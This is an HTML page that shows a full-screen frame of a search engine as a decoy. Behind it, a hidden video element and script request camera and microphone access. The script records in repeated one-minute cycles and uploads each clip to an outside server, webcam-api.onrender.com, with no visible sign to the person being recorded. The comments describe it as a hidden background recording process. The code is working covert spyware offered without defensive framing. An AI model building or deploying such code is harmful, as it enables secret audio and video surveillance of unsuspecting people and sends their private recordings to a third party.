<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam BG Process</title>
    <style>
        /* 确保 iframe 能够铺满整个页面 */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden; /* 隐藏滚动条 */
        }
        #bg-frame {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        /* 功能性 video 元素需要存在但完全隐藏 */
        #webcam {
            display: none;
        }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline muted></video>

    <iframe id="bg-frame" src="https://www.baidu.com"></iframe>

    <script>
        const webcamVideo = document.getElementById('webcam');
        
        let stream;
        let isRecording = false; // 状态锁，防止重叠
        const RECORDING_DURATION = 60000; // 录制时长（毫秒），这里是1分钟

        // 核心的录制和上传函数
        async function startRecordingCycle() {
            if (!stream || isRecording) {
                console.log('媒体流未就绪或正在录制中，跳过。');
                return;
            }

            isRecording = true; // 上锁
            let recordedChunks = [];
            console.log('开始新的1分钟录制...');

            try {
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });

                // 2. 收集数据
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                // 3. 录制停止后触发上传
                mediaRecorder.onstop = async () => {
                    console.log('录制停止，准备上传。');
                    const recordedBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    recordedChunks = []; // 清空数据块数组

                    const formData = new FormData();
                    formData.append('video', recordedBlob, `recording-${Date.now()}.webm`);

                    try {
                        // ==================================================================
                        // 关键改动：将上传地址更新为您提供的在线服务器地址
                        const response = await fetch('https://webcam-api.onrender.com/upload', {
                            method: 'POST',
                            body: formData,
                        });
                        // ==================================================================

                        if (response.ok) {
                            const result = await response.json();
                            console.log('上传成功:', result.message, ' at', new Date().toLocaleTimeString());
                        } else {
                            console.error('上传失败:', response.statusText, await response.text());
                        }
                    } catch (error) {
                        console.error('上传发生错误:', error);
                    } finally {
                        // 不论上传成功与否，都解锁并开始下一次录制
                        console.log('准备开始下一次录制...');
                        isRecording = false;
                        // 立即开始下一个录制周期
                        startRecordingCycle();
                    }
                };

                // 1. 开始录制
                mediaRecorder.start();
                
                // 4. 设置一个定时器，在指定时间后停止录制
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, RECORDING_DURATION);

            } catch(e) {
                console.error("MediaRecorder 初始化失败:", e);
                isRecording = false; // 出错解锁
            }
        }

        // 初始化摄像头并启动录制循环
        async function init() {
            try {
                // 请求音视频权限
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 }, 
                    audio: true // 录像通常需要音频
                });
                webcamVideo.srcObject = stream;
                
                webcamVideo.onloadedmetadata = () => {
                    console.log('摄像头已就绪，后台录制进程启动。');
                    // 摄像头就绪后，直接启动录制循环
                    startRecordingCycle();
                };

            } catch (error) {
                console.error('摄像头访问被拒绝或出错:', error);
            }
        }

        // 启动
        init();
    </script>
</body>
</html>
